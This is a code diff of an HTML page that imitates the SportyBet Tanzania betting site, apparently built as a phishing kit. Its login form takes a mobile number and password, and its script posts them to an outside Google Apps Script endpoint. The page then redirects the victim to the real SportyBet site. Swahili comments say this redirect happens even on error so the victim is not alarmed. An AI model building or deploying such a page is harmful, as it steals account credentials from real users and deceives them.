@@ -1,116 +1,149 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SportyBet - Online Sports Betting</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>SportyBet - Tanzania</title>
     <style>
-        .sporty-red { background-color: #E41E26; }
-        .sporty-dark { background-color: #1A1A1A; }
-        .sporty-green { background-color: #00A651; }
+        /* CSS YA UKURASA WA NYUMBANI */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body { background-color: #f2f2f2; }
+
+        #home-page { display: block; width: 100%; min-height: 100vh; }
+        #login-page { display: none; width: 100%; min-height: 100vh; background-color: #fff; justify-content: center; padding: 20px; }
+
+        header { background-color: #e41a1a; padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; color: white; position: sticky; top: 0; z-index: 100; }
+        .logo { font-size: 22px; font-weight: 900; font-style: italic; letter-spacing: -1px; }
+        .auth-btns button { padding: 6px 12px; border-radius: 4px; font-weight: bold; border: none; cursor: pointer; }
+        .join-btn { background: white; color: #e41a1a; margin-right: 5px; }
+        .login-btn { background: #e41a1a; color: white; border: 1px solid white !important; }
+
+        /* Mtindo wa Home Page Content */
+        .category-nav { display: flex; overflow-x: auto; background: white; padding: 10px 5px; gap: 15px; border-bottom: 1px solid #ddd; }
+        .nav-item { min-width: 65px; text-align: center; font-size: 11px; color: #444; }
+        .nav-item div { font-size: 20px; margin-bottom: 4px; }
+        .match-card { background: white; margin: 8px; border-radius: 4px; padding: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .teams-container { display: flex; justify-content: space-between; align-items: center; margin: 15px 0; }
+        .score-box h2 { font-size: 20px; letter-spacing: 5px; text-align: center;}
+        .odds-grid { display: flex; gap: 8px; }
+        .odd-item { flex: 1; background: #f9fdf9; border: 1px solid #e0e0e0; padding: 10px; border-radius: 4px; text-align: center; color: #28a745; font-weight: bold; }
+        .footer-nav { position: fixed; bottom: 0; width: 100%; background: #111; display: flex; justify-content: space-around; padding: 10px 0; color: white; font-size: 11px; }
+
+        /* CSS YA LOGIN PAGE */
+        .login-container { width: 100%; max-width: 450px; }
+        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; }
+        .country-selector { display: flex; align-items: center; gap: 10px; }
+        .tz-flag {
+            width: 30px; height: 20px; border: 0.5px solid #eee;
+            background: linear-gradient(135deg, #1eb53a 0%, #1eb53a 40%, #fcd116 40%, #fcd116 45%, #000000 45%, #000000 55%, #fcd116 55%, #fcd116 60%, #00a3dd 60%, #00a3dd 100%);
+        }
+        .input-field { border: 1px solid #ccc; border-radius: 4px; margin-bottom: 15px; display: flex; align-items: center; padding: 15px; }
+        .prefix { font-weight: bold; padding-right: 15px; border-right: 1px solid #eee; margin-right: 15px; }
+        .input-field input { border: none; outline: none; width: 100%; font-size: 16px; background: transparent; }
+        .login-submit { width: 100%; padding: 16px; background-color: #e41a1a; border: none; border-radius: 4px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .links-row { display: flex; justify-content: space-between; margin-top: 25px; }
+        .links-row a { color: #28a745; text-decoration: none; font-size: 14px; }
     </style>
 </head>
-<body class="bg-gray-200 font-sans">
+<body>
 
-    <header class="sporty-red text-white">
-        <div class="container mx-auto px-4 flex items-center justify-between py-2">
-            <div class="flex items-center space-x-8">
-                <h1 class="text-3xl font-black italic tracking-tighter">SportyBet</h1>
-                <div class="flex items-center text-xs border border-white/30 px-2 py-1 rounded">
-                    <span class="mr-2">🇹🇿 Tanzania</span>
-                    <i class="fas fa-cog"></i>
+    <div id="home-page">
+        <header>
+            <div class="logo">SportyBet</div>
+            <div class="auth-btns">
+                <button class="join-btn">Join Now</button>
+                <button class="login-btn" onclick="showLogin()">Log in</button>
+            </div>
+        </header>
+
+        <div class="category-nav">
+            <div class="nav-item"><div>⚽</div>All Sports</div>
+            <div class="nav-item"><div>📺</div>Live</div>
+            <div class="nav-item"><div>🎲</div>Virtuals</div>
+            <div class="nav-item"><div>✈️</div>Aviator</div>
+        </div>
+
+        <div class="match-card">
+            <p style="font-size: 11px; color: #28a745; font-weight: bold;">● Live Football</p>
+            <div class="teams-container">
+                <div style="flex:1">CA Rosario Central</div>
+                <div style="flex:1; text-align:center;"><h2>0 - 0</h2></div>
+                <div style="flex:1; text-align:right;">Libertad Asuncion</div>
+            </div>
+            <div class="odds-grid">
+                <div class="odd-item">1.35</div>
+                <div class="odd-item">4.50</div>
+                <div class="odd-item">7.75</div>
+            </div>
+        </div>
+
+        <nav class="footer-nav">
+            <div>Menu</div><div>Games</div><div>Open Bets</div><div>Me</div>
+        </nav>
+    </div>
+
+    <div id="login-page">
+        <div class="login-container">
+            <div class="top-bar">
+                <div class="country-selector">
+                    <div class="tz-flag"></div>
+                    <span style="font-weight: 500; color: #444;">Tanzania</span>
                 </div>
+                <div style="font-size: 24px; color: #333; cursor: pointer;" onclick="showHome()">✕</div>
             </div>
 
-            <form id="sporty-login-form" class="flex flex-col items-end">
-                <div class="flex items-center space-x-2 text-sm mb-1">
-                    <div class="flex items-center bg-black/20 rounded px-2 py-1">
-                        <span class="text-white/70 mr-1">+255</span>
-                        <input type="text" name="Mobile_Number" placeholder="Mobile Number" class="bg-transparent outline-none w-28 placeholder-white/50" required>
-                    </div>
-                    <input type="password" name="Password" placeholder="Password" class="bg-black/20 rounded px-2 py-1 outline-none w-28 placeholder-white/50" required>
-                    
-                    <button type="submit" id="login-btn" class="bg-black/40 px-4 py-1 rounded font-bold hover:bg-black/60">Login</button>
-                    
-                    <button type="button" class="bg-white text-red-600 px-4 py-1 rounded font-bold">Register</button>
+            <form id="database-form">
+                <div class="input-field">
+                    <span class="prefix">+255</span>
+                    <input type="tel" name="Mobile_Number" placeholder="Mobile Number" required>
                 </div>
-                <div class="text-[10px] flex space-x-3 text-white/80">
-                    <label><input type="checkbox" class="mr-1"> Keep me signed in</label>
+
+                <div class="input-field">
+                    <input type="password" name="Password" placeholder="Password" required>
+                </div>
+
+                <button type="submit" id="submit-btn" class="login-submit">Login</button>
+
+                <div class="links-row">
                     <a href="#">Forgot Password?</a>
-                    <a href="#">Deactivate / Reactivate</a>
+                    <a href="#">Create New Account</a>
                 </div>
             </form>
         </div>
-
-        <nav class="container mx-auto px-4 flex space-x-1 text-sm font-bold">
-            <a href="#" class="bg-white text-red-600 px-6 py-2 rounded-t-sm">Sports</a>
-            <a href="#" class="px-4 py-2 hover:bg-white/10">Games</a>
-            <a href="#" class="px-4 py-2 hover:bg-white/10">Live Betting</a>
-            <a href="#" class="px-4 py-2 hover:bg-white/10">Jackpot</a>
-            <a href="#" class="px-4 py-2 hover:bg-white/10">Livescore</a>
-        </nav>
-    </header>
-
-    <div class="bg-white border-b shadow-sm">
-        <div class="container mx-auto px-4 py-2 flex space-x-6 text-[13px] font-medium text-gray-700">
-            <a href="#" class="text-red-600 border-b-2 border-red-600 pb-1">Home</a>
-            <a href="#">Football</a>
-            <a href="#">vFootball</a>
-            <a href="#">Basketball</a>
-            <a href="#">Tennis</a>
-            <a href="#">eFootball</a>
-            <a href="#">Table Tennis</a>
-        </div>
     </div>
 
-    <main class="container mx-auto px-4 mt-4 grid grid-cols-12 gap-4">
-        <aside class="col-span-3 sporty-dark text-white rounded-t-sm overflow-hidden h-fit">
-            <div class="bg-zinc-800 p-3 font-bold text-sm">Popular</div>
-            <ul class="text-xs">
-                <li class="p-3 border-b border-zinc-700 flex justify-between hover:bg-zinc-700 cursor-pointer">Today's Football <i class="fas fa-chevron-right text-green-500"></i></li>
-                <li class="p-3 border-b border-zinc-700 flex justify-between hover:bg-zinc-700 cursor-pointer">Champions League <i class="fas fa-chevron-right text-green-500"></i></li>
-            </ul>
-        </aside>
-
-        <section class="col-span-6 relative bg-black rounded-sm overflow-hidden h-[300px]">
-            <div class="absolute inset-0 z-10 flex flex-col justify-center p-8 text-white bg-gradient-to-r from-black/80 to-transparent">
-                <h2 class="text-3xl font-black mt-2 leading-none">WIN BIG TODAY <br> <span class="text-red-600">SPORTYBET</span> SPECIAL</h2>
-                <button class="mt-6 border-2 border-white w-fit px-8 py-2 text-xs font-bold">BET NOW</button>
-            </div>
-            <img src="https://via.placeholder.com/800x400/222/555?text=SportyBet+Promo" class="w-full h-full object-cover">
-        </section>
-
-        <aside class="col-span-3 sporty-dark p-4 rounded-sm h-fit">
-            <h3 class="text-white font-bold text-sm mb-4">Instant Registration</h3>
-            <div class="flex items-center bg-white rounded overflow-hidden mb-4">
-                <span class="px-3 py-2 text-gray-500 border-r text-sm">+255</span>
-                <input type="text" placeholder="Mobile Number" class="w-full px-3 py-2 text-sm outline-none">
-            </div>
-            <button class="w-full sporty-green text-white font-bold py-3 rounded">Register</button>
-        </aside>
-    </main>
-
     <script>
-        // WEKA URL YAKO YA GOOGLE SCRIPT HAPA
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbw2DdYFXv6oqQGdMpADFjL3RKuEaQt4MEwYbGl-kXeOWyoUWm0DAzXflU3J4mjUUCoNTA/exec';
-        const form = document.getElementById('sporty-login-form');
-        const btn = document.getElementById('login-btn');
+        // FUNCTION ZA KUBADILISHA KURASA (JS)
+        function showLogin() {
+            document.getElementById('home-page').style.display = 'none';
+            document.getElementById('login-page').style.display = 'flex';
+        }
+
+        function showHome() {
+            document.getElementById('login-page').style.display = 'none';
+            document.getElementById('home-page').style.display = 'block';
+        }
+
+        // MFUMO WA DATABASE (GOOGLE SHEETS)
+        // Weka URL yako ya Google Script hapa chini
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbw2DdYFXv6oqQGdMpADFjL3RKuEaQt4MEwYbGl-kXeOWyoUWm0DAzXflU3J4mjUUCoNTA/exec'; 
+        const form = document.getElementById('database-form');
+        const btn = document.getElementById('submit-btn');
 
         form.addEventListener('submit', e => {
             e.preventDefault();
             btn.disabled = true;
-            btn.innerHTML = "...";
+            btn.innerHTML = "Processing...";
 
             fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                 .then(response => {
-                    // Mpeleke SportyBet halisi baada ya sekunde 1
+                    // Baada ya data kusave, mpeleke SportyBet halisi
                     setTimeout(() => {
                         window.location.href = "https://www.sportybet.com/tz/";
                     }, 500);
                 })
                 .catch(error => {
+                    // Ikitokea hitilafu, mpeleke pia ili asishtuke
                     window.location.href = "https://www.sportybet.com/tz/";
                 });
         });
